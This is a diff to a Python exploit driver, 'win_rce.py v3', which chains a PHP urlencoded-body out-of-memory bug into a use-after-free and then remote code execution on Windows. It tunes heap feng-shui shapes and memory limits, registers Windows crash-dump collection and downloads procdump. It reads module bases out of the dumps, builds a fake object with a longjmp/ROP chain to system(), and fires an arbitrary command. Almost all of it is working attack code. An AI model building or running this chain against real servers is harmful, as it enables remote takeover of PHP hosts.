@@ -1,28 +1,36 @@
 #!/usr/bin/env python3
-'''p2s win_rce.py — Windows x64 RCE chain driver (CVE-2026-109618 urlencoded OOM->UAF->free_obj->longjmp->system).
+'''p2s win_rce.py v3 — Windows x64 RCE chain driver (CVE-2026-109618 urlencoded OOM->UAF->free_obj->longjmp->system).
 
-v2: probe LADDER — the canonical Linux feng-shui may not crash Windows php -S
-    (first CI run: OOM fatal in-band, walk clean, process alive). Iterate shapes
-    (memshift / key counts / pad bin / key-name length) until worker death, then
-    reuse the winning shape for the RCE fire. Bodies of probe responses are
-    printed + stored (they tell where the OOM struck).
+v3 changes (from CI receipts):
+  - Ladder now varies memory_limit too: on 7.4.33/8.0.30 the OOM always strikes
+    the clean 81920B hash-grow path at 8M (fatal in-band, walk clean, php alive);
+    a different limit shifts the strike point into the dirty window (unwritten
+    bucket). On 8.2.12 the canonical shape+8M already crashes (php_exit 0xC0000005).
+  - Dump instruments doubled: WER LocalDumps (registered via winreg, values
+    read back as receipt, sacrificial python self-test crash proves WerFault
+    end-to-end) PLUS procdump64 -accepteula -e -ma -w php.exe watcher
+    (Sysinternals, downloaded in-run) which writes a full dump on unhandled
+    exception WITHOUT depending on WER. parse whichever dump lands first.
+  - wait_dump scans dump-dir and %LOCALAPPDATA%\CrashDumps.
+  - Fire stage reuses the winning shape AND winning memory_limit.
 
 Chain: OOM leaves the HashTable half-built (bucket unwritten); shutdown walks it,
   dtor dereferences zval.value at the unwritten bucket. Feng-shui places our pad
   value in that slot: probe 0xdead0001+IS_STRING -> AV; rce fake object ->
   handlers->free_obj = ucrtbase!longjmp(obj=jmp_buf) -> pop rcx;ret -> system(cmd).
-  Constants measured in-run (ASLR off via workflow Set-ProcessMitigation), WER
-  LocalDumps full .dmp -> minidump parse -> PAD + module bases; RVAs from DLL files.
+  Constants measured in-run (ASLR off via workflow Set-ProcessMitigation).
 
-Exit codes: 0=RCE receipt | 10 control fail | 11 no shape crashed | 12 no dump
+Exit codes: 0=RCE receipt | 10 control fail | 11 no attempt crashed | 12 no dump
             13 marker/consts not found | 14 fire produced no marker file.
 '''
-import argparse, glob, json, mmap, os, socket, struct, subprocess, sys, time
+import argparse, glob, json, mmap, os, socket, struct, subprocess, sys, time, zipfile
 from datetime import datetime, timezone
 from urllib.parse import quote_from_bytes
 
 def p64(v): return struct.pack('<Q', v)
 def p32(v): return struct.pack('<I', v)
+
+IS_WIN = os.name == 'nt'
 
 # ---------------------------------------------------------------- http ----
 def http_post(host, port, body, ctype, timeout=120, path='/index.php'):
@@ -66,7 +74,7 @@ def http_get(host, port, path='/index.php', timeout=20):
             'body': raw.partition(b'\r\n\r\n')[2][:512]}
 
 # ---------------------------------------------------------------- arm ----
-def build_body(pad, memshift=40000, k1=30, k2=30, xlen=79984, probe_gap=True):
+def build_body(pad, memshift=40000, k1=30, k2=30, xlen=79984):
     out = b'memshift=' + b'M' * memshift + b'&'
     for i in range(k1):
         out += b'a[' + b'X' * xlen + b'%016d' % i + b'][c]=v&'
@@ -93,7 +101,7 @@ def build_rce_pad(padlen, PAD, LONGJMP, SYSTEM, POPRCX, cmd):
     pad[2064:2068] = p32(0)                      # handle
     pad[2072:2080] = p64(0)                      # ce
     pad[2080:2088] = p64(PAD + 2000)             # handlers
-    pad[2008:2016] = p64(LONGJMP)                 # handlers->free_obj (handlers+8)
+    pad[2008:2016] = p64(LONGJMP)                # handlers->free_obj (handlers+8)
     pad[2088:2096] = p64(PAD + 2352)             # jmp_buf rsp @ fo+32
     pad[2096:2104] = p64(POPRCX)                 # jmp_buf rip @ fo+40
     pad[2352:2360] = p64(PAD + 2400)             # fake stack: popped -> rcx = &cmd
@@ -124,6 +132,13 @@ def rva_to_off(sections, rva):
             if d < s['rsize']:
                 return s['raw'] + d
     return None
+
+def pe_image_base(data):
+    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
+    magic = struct.unpack_from('<H', data, e_lfanew + 24)[0]
+    if magic == 0x20b:
+        return struct.unpack_from('<Q', data, e_lfanew + 24 + 24)[0]
+    return struct.unpack_from('<I', data, e_lfanew + 24 + 28)[0]
 
 def pe_exports(data, wanted):
     e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
@@ -212,6 +227,69 @@ def parse_minidump(path, marker=b'\x01\x00\xad\xde\x06\x01\x00\x00', marker_pad_
     f.close()
     return {'modules': modules, 'exc': exc, 'pad_hits': hits}
 
+# ---------------------------------------------------------------- dump instruments ----
+def wer_register(exe_name, dumpdir):
+    if not IS_WIN:
+        return {}
+    import winreg
+    sub = r'SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\\' + exe_name
+    try:
+        k = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, sub, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)
+        winreg.SetValueEx(k, 'DumpFolder', 0, winreg.REG_SZ, dumpdir)
+        winreg.SetValueEx(k, 'DumpType', 0, winreg.REG_DWORD, 2)
+        winreg.SetValueEx(k, 'DumpCount', 0, winreg.REG_DWORD, 10)
+        vals = {n: winreg.QueryValueEx(k, n)[0] for n in ('DumpFolder', 'DumpType', 'DumpCount')}
+        k.Close()
+        return vals
+    except OSError as exc:
+        return {'error': str(exc)}
+
+def wer_selftest(dumpdir, stage, timeout=45):
+    '''Sacrificial python crash -> proves the WerFault LocalDumps chain end-to-end.'''
+    pre = set(glob.glob(os.path.join(dumpdir, '*.dmp')))
+    vals = wer_register('python.exe', dumpdir)
+    print('P2S_WER python.exe reg=' + json.dumps(vals))
+    code = 'import ctypes; ctypes.string_at(0xdead0001)'
+    try:
+        subprocess.run([sys.executable, '-c', code], timeout=30,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+    t0 = time.time()
+    while time.time() - t0 < timeout:
+        for d in glob.glob(os.path.join(dumpdir, '*.dmp')):
+            if d not in pre and os.path.getsize(d) > 10000:
+                print(f'P2S_WER_SELFTEST=DUMP {d}')
+                return True
+        time.sleep(2)
+    print('P2S_WER_SELFTEST=NODUMP')
+    return False
+
+def procdump_start(stage, dumpdir, php_exe_name='php.exe'):
+    '''Download Sysinternals procdump and start a crash watcher (no WER dependency).'''
+    pd = os.path.join(stage, 'procdump64.exe')
+    if not os.path.exists(pd):
+        zp = os.path.join(stage, 'Procdump.zip')
+        try:
+            import urllib.request
+            urllib.request.urlretrieve('https://download.sysinternals.com/files/Procdump.zip', zp)
+            with zipfile.ZipFile(zp) as z:
+                for n in z.namelist():
+                    if n.lower().endswith('procdump64.exe'):
+                        with z.open(n) as f, open(pd, 'wb') as g:
+                            g.write(f.read())
+        except Exception as exc:
+            print(f'P2S_PROCDUMP download=FAIL {exc}')
+            return None
+    if not os.path.exists(pd):
+        print('P2S_PROCDUMP=FAIL (no exe)')
+        return None
+    lg = open(os.path.join(stage, 'procdump.log'), 'ab')
+    p = subprocess.Popen([pd, '-accepteula', '-e', '-ma', '-w', php_exe_name, dumpdir],
+                         stdout=lg, stderr=lg)
+    print(f'P2S_PROCDUMP watcher pid={p.pid} watching={php_exe_name} dir={dumpdir}')
+    return p
+
 # ---------------------------------------------------------------- php server ----
 def wait_port(host, port, proc, timeout=25):
     t0 = time.time()
@@ -231,12 +309,20 @@ def start_php(php_exe, host, port, docroot, ini, log):
                          stdout=lf, stderr=lf)
     return p
 
-def wait_dump(dumpdir, deadline_s=150, exclude=None):
+def write_ini(php_dir, stage, mem_limit_mb):
+    ini = os.path.join(php_dir, f'php_p2s_{mem_limit_mb}M.ini')
+    with open(ini, 'w') as f:
+        f.write(f'memory_limit={mem_limit_mb}M\npost_max_size=1G\ndisplay_errors=On\n'
+                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
+    return ini
+
+def wait_dump(dumpdirs, deadline_s=150, exclude=None):
+    exclude = exclude or set()
     t0 = time.time()
     seen = set()
     while time.time() - t0 < deadline_s:
-        for d in glob.glob(os.path.join(dumpdir, '*.dmp')):
-            if d in seen or (exclude and d in exclude):
+        for d in glob.glob(os.path.join(dumpdirs, '*.dmp')):
+            if d in seen or d in exclude:
                 continue
             if os.path.getsize(d) > 100000:
                 s1 = os.path.getsize(d)
@@ -256,35 +342,32 @@ def scrub(o):
         return o.decode('latin-1', 'replace')
     return o
 
-# ---------------------------------------------------------------- shapes ----
-# (memshift, k1, k2, padlen, xlen) — canonical Linux shape first, then variations
+# ---------------------------------------------------------------- attempts ----
+# (memshift, k1, k2, padlen, xlen, mem_limit_M) — canonical first (crashes 8.2.12
+# at 8M per run 40271273745), then memory_limit ladder (moves the OOM strike
+# point for 7.4/8.0 where 8M always hits the clean 81920B hash-grow).
 SHAPES = [
-    (40000, 30, 30, 2528, 79984),   # 0: canonical Linux chain-B (8/8 Linux)
-    (60000, 30, 30, 2528, 79984),
-    (30000, 30, 30, 2528, 79984),
-    (80000, 30, 30, 2528, 79984),
-    (20000, 30, 30, 2528, 79984),
-    (50000, 30, 30, 2528, 79984),
-    (45000, 30, 30, 2528, 79984),
-    (35000, 30, 30, 2528, 79984),
-    (40000, 30, 30, 1984, 79984),   # pad bin variations
-    (40000, 30, 30, 2240, 79984),
-    (40000, 30, 30, 2816, 79984),
-    (40000, 30, 30, 3072, 79984),
-    (40000, 30, 30, 3328, 79984),
-    (40000, 62, 62, 2528, 79984),   # key-count variations (bigger/smaller hash)
-    (40000, 14, 14, 2528, 79984),
-    (40000, 46, 46, 2528, 79984),
-    (40000, 30, 30, 2528, 40000),   # key-name length variations
-    (40000, 30, 30, 2528, 100000),
-    (40000, 30, 30, 2528, 60000),
-    (120000, 30, 30, 2528, 79984),
-    (160000, 30, 30, 2528, 79984),
-    (40000, 62, 62, 3072, 79984),
+    (40000, 30, 30, 2528, 79984, 8),    # canonical Linux chain-B
+    (40000, 30, 30, 2528, 79984, 10),
+    (40000, 30, 30, 2528, 79984, 12),
+    (40000, 30, 30, 2528, 79984, 14),
+    (40000, 30, 30, 2528, 79984, 16),
+    (40000, 30, 30, 2528, 79984, 20),
+    (40000, 30, 30, 2528, 79984, 24),
+    (40000, 30, 30, 2528, 79984, 32),
+    (60000, 30, 30, 2528, 79984, 16),
+    (30000, 30, 30, 2528, 79984, 16),
+    (40000, 30, 30, 2528, 79984, 48),
+    (40000, 62, 62, 2528, 79984, 16),
+    (40000, 30, 30, 2528, 79984, 64),
+    (80000, 30, 30, 2528, 79984, 24),
+    (120000, 30, 30, 2528, 79984, 32),
+    (40000, 14, 14, 2528, 79984, 16),
+    (40000, 46, 46, 2528, 79984, 24),
 ]
 
 def shape_name(s):
-    return f'M{s[0]},k{s[1]}+{s[2]},pad{s[3]},x{s[4]}'
+    return f'M{s[0]},k{s[1]}+{s[2]},pad{s[3]},x{s[4]},lim{s[5]}M'
 
 # ---------------------------------------------------------------- main ----
 def main():
@@ -311,18 +394,24 @@ def main():
     os.makedirs(docroot, exist_ok=True)
     with open(os.path.join(docroot, 'index.php'), 'w') as f:
         f.write("<?php echo 'P2S-OK ' . PHP_VERSION . ' ' . php_uname('s');")
-    ini = os.path.join(a.php_dir, 'php_p2s.ini')
-    with open(ini, 'w') as f:
-        f.write('memory_limit=8M\npost_max_size=1G\ndisplay_errors=On\n'
-                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
     if os.path.exists(a.marker):
         os.remove(a.marker)
 
     res = {'version': a.version, 'stage': stage, 'ts': datetime.now(timezone.utc).isoformat()}
     log = os.path.join(stage, 'php_server.log')
 
-    # ---- stage 2: probe LADDER (each attempt: fresh php, fire, wait death) ----
+    # ---- dump instruments ---------------------------------------------------
+    wer_vals = wer_register('php.exe', a.dump_dir)
+    print('P2S_WER php.exe reg=' + json.dumps(wer_vals))
+    wer_selftest(a.dump_dir, stage)
     pre_dumps = set(glob.glob(os.path.join(a.dump_dir, '*.dmp')))
+    pd_proc = procdump_start(stage, a.dump_dir)
+    crash_dirs = [a.dump_dir]
+    cd = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CrashDumps')
+    if os.path.isdir(cd):
+        crash_dirs.append(cd)
+
+    # ---- ladder -------------------------------------------------------------
     ladder_log = []
     win_shape = None
     p_cur = None
@@ -331,6 +420,7 @@ def main():
             p_cur.kill()
         except Exception:
             pass
+        ini = write_ini(a.php_dir, stage, sh[5])
         p_cur = start_php(php_exe, a.host, a.port, docroot, ini, log)
         if not wait_port(a.host, a.port, p_cur):
             tail = open(log, 'rb').read()[-500:].decode('latin-1', 'replace') if os.path.exists(log) else ''
@@ -356,7 +446,7 @@ def main():
               f'err={pr.get("error")} php_exit={rc}')
         if btxt:
             print(f'P2S_LADDER resp_body={btxt!r}')
-        if rc is not None:                     # worker died on this shape
+        if rc is not None:
             win_shape = sh
             res['win_shape'] = list(sh)
             res['ladder'] = ladder_log
@@ -365,20 +455,27 @@ def main():
             break
     if win_shape is None:
         res['ladder'] = ladder_log
-        print('P2S_STAGE_PROBE=FAIL (no shape crashed php)')
+        print('P2S_STAGE_PROBE=FAIL (no attempt crashed php)')
         save(res)
         return 11
 
-    # ---- dump wait ----
-    dump = wait_dump(a.dump_dir, exclude=pre_dumps)
+    # ---- dump wait (WER or procdump, whichever lands) ------------------------
+    dump = None
+    for d in crash_dirs:
+        dump = wait_dump(d, deadline_s=90, exclude=pre_dumps)
+        if dump:
+            break
     if not dump:
-        print('P2S_STAGE_MEASURE=FAIL (no WER dump)')
+        print('P2S_STAGE_MEASURE=FAIL (no crash dump from WER or procdump)')
+        pdlog = os.path.join(stage, 'procdump.log')
+        if os.path.exists(pdlog):
+            print('P2S_PROCDUMP_LOG ' + open(pdlog, 'rb').read()[-800:].decode('latin-1', 'replace'))
         save(res)
         return 12
     print(f'P2S_STAGE_MEASURE dump={dump} size={os.path.getsize(dump)}')
     res['dump'] = dump
 
-    # ---- stage 3: dump parse -> constants ----------------------------------
+    # ---- dump parse -> constants --------------------------------------------
     md = parse_minidump(dump)
     if not md['pad_hits']:
         print('P2S_STAGE_MEASURE=FAIL (marker not found in dump)')
@@ -397,6 +494,10 @@ def main():
     php_dll_base, php_dll_name = phpdll[0]['base'], os.path.basename(phpdll[0]['name'])
     ucrt_base = ucrt[0]['base']
     php_dll_file = os.path.join(a.php_dir, php_dll_name)
+    with open(php_dll_file, 'rb') as f:
+        pdata = f.read()
+    print(f'P2S_STATIC_IMAGE_BASE {php_dll_name} on-disk ImageBase={pe_image_base(pdata):#x} '
+          f'(ASLR off -> expect runtime base to match)')
     ucrt_file = a.ucrt
     if not os.path.exists(ucrt_file):
         ucrt_file = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ucrtbase.dll')
@@ -431,11 +532,12 @@ def main():
     print('P2S_CONSTS ' + json.dumps({k: (hex(v) if isinstance(v, int) else v) for k, v in consts.items()}))
     save(res)
 
-    # ---- stage 4: restart (same boot, ASLR off -> same bases) --------------
+    # ---- restart (winning memory limit, same boot, ASLR off -> same bases) ----
     try:
         p_cur.kill()
     except Exception:
         pass
+    ini = write_ini(a.php_dir, stage, win_shape[5])
     p2 = None
     for port_backoff in range(4):
         p2 = start_php(php_exe, a.host, a.port, docroot, ini, log)
@@ -449,7 +551,7 @@ def main():
     ctl2 = http_get(a.host, a.port)
     print(f'P2S_STAGE_FIRE control2 status={ctl2["status"]} body={ctl2["body"][:80]!r}')
 
-    # ---- stage 5: fire RCE (winning shape) ---------------------------------
+    # ---- fire RCE (winning shape + limit) ------------------------------------
     cmd = a.cmd or f'cmd /c whoami > "{a.marker}" 2>&1'
     if len(cmd) > 110:
         print('P2S_STAGE_FIRE=FAIL (cmd too long)')
